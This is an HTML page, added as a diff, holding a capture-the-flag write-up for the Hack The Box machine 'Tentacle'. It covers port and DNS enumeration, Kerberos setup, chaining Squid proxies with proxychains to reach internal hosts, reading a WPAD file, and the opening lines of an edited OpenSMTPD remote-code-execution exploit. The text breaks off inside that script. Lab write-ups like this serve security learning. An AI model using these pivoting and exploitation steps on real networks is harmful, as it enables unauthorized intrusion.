@@ -1,0 +1,1438 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    <meta property="article:tag" content="hackthebox" />
+    
+    <meta property="article:tag" content="htb" />
+    
+    <meta property="article:tag" content="boot2root" />
+    
+    <meta property="article:tag" content="writeup" />
+    
+    <meta property="article:tag" content="linux" />
+    
+    <meta property="article:tag" content="tentacle" />
+    
+    <meta property="article:tag" content="squid" />
+    
+    <meta property="article:tag" content="squid proxy" />
+    
+    <meta property="article:tag" content="proxychains" />
+    
+    <meta property="article:tag" content="wpad" />
+    
+    <meta property="article:tag" content="web proxy auto-discovery" />
+    
+    <meta property="article:tag" content="web proxy auto discovery" />
+    
+    <meta property="article:tag" content="web proxy autodiscovery" />
+    
+    <meta property="article:tag" content="wpad.dat" />
+    
+    <meta property="article:tag" content="kerberos" />
+    
+    <meta property="article:tag" content="kinit" />
+    
+    <meta property="article:tag" content="klist" />
+    
+    <meta property="article:tag" content="kadmin" />
+    
+    <meta property="article:tag" content="ksu" />
+    
+    <meta property="article:tag" content="kerberos principal" />
+    
+    <meta property="article:tag" content="principals" />
+    
+    <meta property="article:tag" content="user principal" />
+    
+    <meta property="article:tag" content="service principal" />
+    
+    <meta property="article:tag" content="keytab" />
+    
+    <meta property="article:tag" content="k5login" />
+    
+    <meta property="article:tag" content="rsync" />
+        
+
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="HTB Tentacle">
+    <meta name="twitter:description" content="10.10.10.224 | 40 pts">
+    <meta name="twitter:site" content="@jebidiah-anthony" />
+    <meta name="twitter:creator" content="@feeeellliix">
+
+    
+    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/49_unbalanced/unbalanced.png" />
+    
+
+    
+    <meta property="og:title" content="HTB Tentacle" />
+    
+
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>HTB Tentacle | jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="HTB Tentacle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="10.10.10.224 40 pts" />
+<meta property="og:description" content="10.10.10.224 40 pts" />
+<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/63_Tentacle.html" />
+<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/63_Tentacle.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"description":"10.10.10.224 40 pts","@type":"WebPage","headline":"HTB Tentacle","url":"https://jebidiah-anthony.github.io/boxes/63_Tentacle.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <style>
+      .user_host { color: green; }
+      .sys_dir { color: #779ECB; }
+      p { color:#aaa; }
+      header { margin-bottom: 0px; }
+      .header .navbtn {
+	position: fixed;
+	width: 0px;
+	visibility: hidden;
+      }
+      .header .title { 
+	padding-left: 69px;
+	vertical-align: middle;
+      }
+      .header .title h2 { margin: 0; } 
+
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        height: 100%;
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      .openbtn { 
+	color:#b5e853;
+	font-size:30px;
+	cursor:pointer
+      }
+      .closebtn {
+	color:#b5e853;
+	font-size:69px;
+	cursor:pointer;
+	position:absolute;
+	top:0;
+	right:25px;
+	font-size:36px;
+	margin-left:50px;
+	visibility:hidden;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+ 	display: block;
+	margin-left: auto;
+	margin-right: auto;
+	max-width: 100%;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+        padding-left: 25px; 
+      }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 10px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (min-width: 801px) {
+	.ctf_content {
+          margin-left: 250px;
+	  padding-bottom: 5px;
+        }
+      }
+      @media screen and (max-width: 800px) {
+        header {
+	  background-color: #202020;
+	  height: 80px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 80px;
+	  padding: 18px 0 0 20px;
+          visibility: visible;
+	  width: 100px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { padding-top: 5px; }
+        .header .title h2 { margin: 0; }
+
+	.container {
+	  width:100%;
+	}
+	.sidebar {
+          width: 0;
+          z-index: 1;
+          overflow-x: hidden;
+	  padding: 0;
+          transition: 0.5s;
+	}
+	.sidebar h2 { 
+	  font-size: 18px; 
+	  padding: 10px 10px 5px 10px;
+	}
+	.sidebar div { 
+	  font-size: 15px; 
+	  padding: 5px 10px 5px 10px;
+	}
+	.closebtn { visibility:visible; }
+
+	.highlighter-rouge { padding: 0 0 0 0; }
+
+	.ctf_content {
+	  margin: 0;
+	}
+	.ctf_content h2 { padding: 15px 0px 0px 5px; }
+        .ctf_content h3 { margin: 15px 10px 0px 15px; }
+        .ctf_content img {
+	  max-width: 100%;
+	  padding: 0 10px 0 0;
+        }
+	.ctf_content table { 
+	  margin: 0 10px 0px -8px;
+	  min-width: 800px;
+	}
+
+        #main_content { margin-top:80px; }
+	#main_content code { font-size: 15px; }
+	#main_content h1 { font-size: 25px; }
+	#main_content h2 { font-size: 22px; }
+	#main_content h3 { font-size: 18px; }
+	#main_content h4 { padding-left: 20px; }
+	#main_content ol, ul {
+	  font-size: 14px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 14px; }
+      }
+
+      @media screen and (max-width: 480px) {
+        header {
+	  background-color: #202020;
+	  height: 70px;
+	  padding: 0px 0 0 0;
+	  position: fixed;
+	  top: 0;
+	}
+        .header .navbtn {
+          height: 70px;
+	  padding: 14px 0 0 18px;
+        }
+	.header .title { padding-left: 100px; }
+	.header .title h1 { font-size:22px; }
+        .header .title h2 { font-size:16px; }
+
+	#main_content code { font-size: 13px; }
+        #main_content ol, ul {
+	  font-size: 13px;
+	  margin: 0 0 0 12px;
+	  padding: 0 0 0 25px;
+	}
+	#main_content table { font-size: 13px; }
+      }
+    </style>
+
+  </head>
+
+  <body>
+    <div class="container">
+       <div id="sidebar" class="sidebar">
+         <span class="closebtn" onclick="closeNav()">&times;</span>      
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">
+  
+  > <a href="/">whoami</a>
+  
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    <strong style="color:orange">htb writeups</strong>
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/ctf.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    projects
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top: 20px">[HTB BOXES]</h2>
+
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/62_Travel.html">Travel</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/61_Quick.html">Quick</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/49_Unbalanced.html">Unbalanced</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/38_Bitlab.html">Bitlab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/33_Safe.html">Safe</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/32_Ellingson.html">Ellingson</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/31_WriteUp.html">WriteUp</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/30_swagshop.html">swagshop</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/29_kryptos.html">kryptos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/28_Luke.html">Luke</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/26_CTF.html">CTF</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/25_Friendzone.html">Friendzone</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/24_Flujab.html">Flujab</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/23_Help.html">Help</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/22_Chaos.html">Chaos</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/21_Lightweight.html">Lightweight</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/20_Irked.html">Irked</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/19_Teacher.html">Teacher</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/15_Mischief.html">Mischief</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="https://jebidiah-anthony.github.io/boxes/14_Waldo.html">Waldo</a>
+  
+</div>
+
+
+
+	   
+	 </div>
+       </div>
+       <div id="content" class="ctf_content">
+	 <header>
+           <div class="header">
+             <div class="navbtn">
+               <span class="openbtn" onclick="openNav()">&#9776;</span>
+	     </div>
+	     <div class="title">
+               <h1>jebidiah-anthony</h1>
+               <h2 style="padding:0 0 0 0">write-ups and what not</h2>
+	     </div>
+           </div>
+         </header>
+         <section id="main_content"><div class="paragraph">
+<p><h1 style="color:red"> HTB Tentacle (10.10.10.224) </h1></p>
+</div>
+<hr>
+<hr>
+<div class="sect1">
+<h2 id="part-1-initial-recon">PART 1 : INITIAL RECON</h2>
+<div class="sectionbody">
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>nmap <span class="nt">--min-rate</span> 3000 <span class="nt">-oN</span> nmap-tcp.initial <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">-v</span> 10.10.10.224
+  r
+  PORT     STATE SERVICE
+  22/tcp   open  ssh
+  53/tcp   open  domain
+  88/tcp   open  kerberos-sec
+  3128/tcp open  squid-http
+
+<span class="nv">$ </span>nmap <span class="nt">-oN</span> nmap-tcp <span class="nt">-p</span> 22,53,88,3128 <span class="nt">-Pn</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.10.10.224
+
+  PORT     STATE SERVICE      VERSION
+  22/tcp   open  ssh          OpenSSH 8.0 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+  | ssh-hostkey:
+  |   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c <span class="o">(</span>RSA<span class="o">)</span>
+  |   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 <span class="o">(</span>ECDSA<span class="o">)</span>
+  |_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b <span class="o">(</span>ED25519<span class="o">)</span>
+  53/tcp   open  domain       ISC BIND 9.11.20 <span class="o">(</span>RedHat Enterprise Linux 8<span class="o">)</span>
+  | dns-nsid:
+  |_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
+  88/tcp   open  kerberos-sec MIT Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-04-05 12:07:18Z<span class="o">)</span>
+  3128/tcp open  http-proxy   Squid http proxy 4.11
+  |_http-server-header: squid/4.11
+  |_http-title: ERROR: The requested URL could not be retrieved
+  Service Info: Host: REALCORP.HTB<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:redhat:enterprise_linux:8</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-2-port-enumeration">PART 2 : PORT ENUMERATION</h2>
+<div class="sectionbody">
+<div class="sect2">
+<h3 id="tcp-port-3128-squid-proxy">TCP PORT 3128 : SQUID PROXY</h3>
+<div class="quoteblock">
+<blockquote>
+<div class="imageblock">
+<div class="content">
+<img src="/boxes/screenshots/63_tentacle/3128_landing_page.png" alt="REALCORP.HTB">
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The cache administrator seems to be <code><strong>j.nakazawa@realcorp.htb</strong></code>  and the response page seems to have been generated from <code><strong>srv01.realcorp.htb</strong></code>. The following line could now be added to the <code><strong>/etc/hosts</strong></code> file:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell">10.10.10.224    realcorp.htb srv01.realcorp.htb</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+</div>
+<div class="sect2">
+<h3 id="tcp-port-53-dns">TCP PORT 53 : DNS</h3>
+<div class="paragraph">
+<p>Checking for interesting entries using <code><strong>dig</strong></code>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>dig realcorp.htb @10.10.10.224 ANY
+
+  <span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.12-Debian &lt;&lt;<span class="o">&gt;&gt;</span> realcorp.htb @10.10.10.224 ANY
+  <span class="p">;;</span> global options: +cmd
+  <span class="p">;;</span> Got answer:
+  <span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 14447
+  ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2
+
+  ;; OPT PSEUDOSECTION:
+  ; EDNS: version: 0, flags:; udp: 4096
+  ; COOKIE: 1a6b321e3284ed2a9f10df79606b26827e20fd87e56d7383 (good)
+  ;; QUESTION SECTION:
+  ;realcorp.htb.			IN	ANY
+
+  ;; ANSWER SECTION:
+  realcorp.htb.		259200	IN	SOA	realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400
+  realcorp.htb.		259200	IN	NS	ns.realcorp.htb.
+
+  ;; ADDITIONAL SECTION:
+  ns.realcorp.htb.	259200	IN	A	10.197.243.77
+
+  ;; Query time: 171 msec
+  ;; SERVER: 10.10.10.224#53(10.10.10.224)
+  ;; WHEN: Mon Apr 05 11:02:26 EDT 2021
+  ;; MSG SIZE  rcvd: 143
+</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Now to look for interesting subdomains:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat</span> ~/shares/security/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt<span class="si">)</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>nslookup <span class="nt">-type</span><span class="o">=</span>any <span class="nv">$i</span>.realcorp.htb 10.10.10.224 | <span class="nb">grep</span> <span class="nt">-i</span> name<span class="o">)</span><span class="p">;</span> <span class="k">done
+
+  </span>Name:	ns.realcorp.htb
+  proxy.realcorp.htb	canonical name <span class="o">=</span> ns.realcorp.htb.
+  Name:	wpad.realcorp.htb
+
+<span class="nv">$ </span>nslookup proxy.realcorp.htb 10.10.10.224
+
+  Server:		10.10.10.224
+  Address:	10.10.10.224#53
+
+  proxy.realcorp.htb	canonical name <span class="o">=</span> ns.realcorp.htb.
+  Name:	ns.realcorp.htb
+  Address: 10.197.243.77
+
+<span class="nv">$ </span>nslookup wpad.realcorp.htb 10.10.10.224
+
+  Server:		10.10.10.224
+  Address:	10.10.10.224#53
+
+  Name:	wpad.realcorp.htb
+  Address: 10.197.243.31</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>There were two subdomains found, <code><strong>proxy.realcorp.htb</strong></code> and <code><strong>wpad.realcorp.htb</strong></code>, but the IPs associated with them seems to be internal and is currently inaccessible from the local machine.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="tcp-port-22-ssh">TCP PORT 22 : SSH</h3>
+<div class="paragraph">
+<p>Trying to fail the password prompt three times will show what authentication methods are available:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="gp">$</span><span class="w"> </span>ssh <span class="nt">-l</span> j.nakazama 10.10.10.224
+<span class="go">
+  j.nakazama@10.10.10.224's password:
+  Permission denied, please try again.
+  j.nakazama@10.10.10.224's password:
+  Permission denied, please try again.
+  j.nakazama@10.10.10.224's password:
+  j.nakazama@10.10.10.224: Permission denied (gssapi-keyex,gssapi-with-mic,password).</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>In this case the allowed authentication methods are&#8201;&#8212;&#8201;<code><strong>gssapi-keyex</strong></code>, <code><strong>gssapi-with-mic</strong></code>, <code><strong>password</strong></code></p>
+</div>
+<div class="paragraph">
+<p>GSSAPI Authentication seems to be supported on the machine and it is usually used with Kerberos. Knowing that there is an open TCP port 88 (Kerberos), this might be the way to authenticate into the machine.</p>
+</div>
+</div>
+<div class="sect2">
+<h3 id="tcp-port-88-kerberos">TCP PORT 88 : KERBEROS</h3>
+<div class="paragraph">
+<p>Setting up the <strong>kerberos</strong> configuration <code><strong>/etc/krb5.conf</strong></code>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">sudo mv</span> /etc/krb5.conf /etc/krb.conf_
+
+<span class="nv">$ </span><span class="nb">sudo </span>vim /etc/krb5.conf</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="go">[libdefaults]
+	  default_realm = REALCORP.HTB
+	  dns_lookup_realm = false
+	  dns_lookup_kdc = false
+[realms]
+	  REALCORP.HTB = {
+    		kdc = 10.10.10.224
+  	}</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Then trying to run <code><strong>kinit</strong></code> to generate a <strong>krbtgt</strong> ticket:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>kinit <span class="nt">-V</span> j.nakazawa
+
+  Using default cache: /tmp/krb5cc_1000
+  Using principal: j.nakazawa@REALCORP.HTB
+  Password <span class="k">for </span>j.nakazawa@REALCORP.HTB:</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>Generating a <code><strong>krbtgt</strong></code> ticket seems possible for the machine however, no user credentials has been found as of yet.</p>
+</div>
+<hr>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-3-proxychains">PART 3 : PROXYCHAINS</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Adding first the initial proxy found from the nmap scan to <code><strong>/etc/proxychains.conf</strong></code></p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="go">http 10.10.10.224 3128</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The previously found IPs using <code><strong>nslookup</strong></code> were still unaccessible&#8201;&#8212;&#8201;<strong>10.197.243.77</strong> (proxy.realcorp.htb) and <strong>10.197.243.31</strong> (wpad.realcorp.htb); however, a hop to localhost is possible:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains nmap <span class="nt">-p</span> 21,22,25,53,80,88,3128 <span class="nt">-v</span> 127.0.0.1
+
+  PORT     STATE  SERVICE
+  21/tcp   closed ftp
+  22/tcp   open   ssh
+  25/tcp   closed smtp
+  53/tcp   open   domain
+  80/tcp   closed http
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The <code><strong>nmap</strong></code> scan was done with common ports. Now, adding a hop to localhost to the <strong>proxychains</strong> configuration:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="go">http 10.10.10.224 3128
+http 127.0.0.1 3128</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains nmap <span class="nt">-p</span> 21,22,25,53,80,88,3128 <span class="nt">-v</span> 10.197.243.77
+
+  PORT     STATE  SERVICE
+  PORT     STATE  SERVICE
+  21/tcp   closed ftp
+  22/tcp   open   ssh
+  25/tcp   closed smtp
+  53/tcp   open   domain
+  80/tcp   closed http
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>A hop to <strong>10.197.243.77</strong> (proxy.realcorp.htb) is now possible while <strong>10.197.243.31</strong> (wpad.realcorp.htb) is still unaccessible. Since TCP port 3128 is still open for 10.197.243.77, might as well add it to the <strong>proxychains</strong> configuration file.</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="go">http 10.10.10.224   3128
+http 127.0.0.1      3128
+http 10.197.243.77  3128</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains nmap <span class="nt">-p</span> 21,22,25,53,80,88,3128 <span class="nt">-v</span> 10.197.243.77
+
+  PORT     STATE  SERVICE
+  PORT     STATE  SERVICE
+  21/tcp   closed ftp
+  22/tcp   open   ssh
+  25/tcp   closed smtp
+  53/tcp   open   domain
+  80/tcp   open   http
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>This time, while <strong>10.197.243.31</strong> (wpad.realcorp.htb) is now accessible, TCP port 80 is also now open. Port 80 must be where the previously found virtualhost, <code><strong>wpad.realcorp.htb</strong></code>, was hosted. Adding the following line to the <code><strong>/etc/hosts</strong></code> file then trying to access the open http service:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="console"><span class="go">10.10.10.224    srv01.realcorp.htb realcorp.htb
+10.197.243.31   wpad.realcorp.htb</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains curl <span class="nt">-I</span> http://wpad.realcorp.htb
+
+  HTTP/1.1 403 Forbidden
+  Server: nginx/1.14.1
+  Date: xxx, xx xxx xxxx xx:xx:xx GMT
+  Content-Type: text/html
+  Content-Length: 169
+  Connection: keep-alive</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>The page returns with a 403 (Forbidden) Response Code but, after googling the releveance of <em>*wpad*</em>, it leads you to a handful of results about <strong>Web Proxy Auto-Discovery</strong>. What it does is it helps browsers determine which proxy server to connect to by guiding them towards the PAC <em>*(proxy auto-config) file*</em>. In this case the PAC file for WPAD is called <strong>wpad.dat</strong>:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains curl http://wpad.realcorp.htb/wpad.dat
+
+  <span class="k">function </span>FindProxyForURL<span class="o">(</span>url, host<span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span>dnsDomainIs<span class="o">(</span>host, <span class="s2">"realcorp.htb"</span><span class="o">))</span>
+        <span class="k">return</span> <span class="s2">"DIRECT"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>isInNet<span class="o">(</span>dnsResolve<span class="o">(</span>host<span class="o">)</span>, <span class="s2">"10.197.243.0"</span>, <span class="s2">"255.255.255.0"</span><span class="o">))</span>
+        <span class="k">return</span> <span class="s2">"DIRECT"</span><span class="p">;</span>
+    <span class="c"><mark>if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))</mark></span>
+        <span class="k">return</span> <span class="s2">"DIRECT"</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="s2">"PROXY proxy.realcorp.htb:3128"</span><span class="p">;</span>
+  <span class="o">}</span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>This indicates that from <code><strong>proxy.realcorp.htb:3128</strong></code>, all connections within the IP ranges specified or from domains with <code><strong>realcorp.htb</strong></code> are passed through; however, with this, a new set of IPs are found&#8201;&#8212;&#8201;<strong>10.241.251.0/24</strong>. And now running an nmap scan for that IP range:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains nmap <span class="nt">-oN</span> nmap-tcp_10.241.251.0_24 <span class="nt">-p</span> 21,22,25,53,80,88,3128 <span class="nt">-v</span> 10.241.251.0/24
+
+<span class="nv">$ </span><span class="nb">cat </span>nmap-tcp_10.241.251.0_24| <span class="nb">grep</span> <span class="nt">-B10</span> open | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"Nmap|open|PORT"</span>
+
+  Nmap scan report <span class="k">for </span>10.241.251.1
+  PORT     STATE  SERVICE
+  22/tcp   open   ssh
+  53/tcp   open   domain
+  88/tcp   open   kerberos-sec
+  3128/tcp open   squid-http
+
+  Nmap scan report <span class="k">for </span>10.241.251.113
+  PORT     STATE  SERVICE
+  <span class="c"><mark>25/tcp   open   smtp</mark></span></code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<div class="paragraph">
+<p>There seems to be open ports in <code><strong>10.241.251.1</strong></code> the same as the ones found from previous scans but this time, there is an open TCP port 25 (SMTP) on <code><strong>10.241.251.113</code> and doing a service scan using <code>*nmap</strong></code> reveals the following:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>proxychains nmap <span class="nt">-p</span> 25 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> 10.241.251.113
+
+  PORT   STATE SERVICE VERSION
+  25/tcp open  smtp    OpenSMTPD
+  | smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org <span class="o">[</span>10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP,
+  |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs <span class="k">in </span>the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+  Service Info: Host: smtp.realcorp.htb</code></pre>
+</div>
+</div>
+</blockquote>
+</div>
+<hr>
+</div>
+</div>
+<div class="sect1">
+<h2 id="part-4-exploitation">PART 4 : EXPLOITATION</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>An <strong>OpenSMTPD 2.0.0</strong> service seems to be running on <code>10.241.251.113</code> and upon searching for an existing, this came up&#8201;&#8212;&#8201;<a href="https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/">Remote code execution in OpenSMTPD</a>. A few lines from the exploit were edited since it will not work right out the box:</p>
+</div>
+<div class="quoteblock">
+<blockquote>
+<div class="listingblock">
+<div class="content">
+<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="c1"><mark>HOST = "10.241.251.113"</mark>
+</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">25</span>              <span class="c1"># smtp port
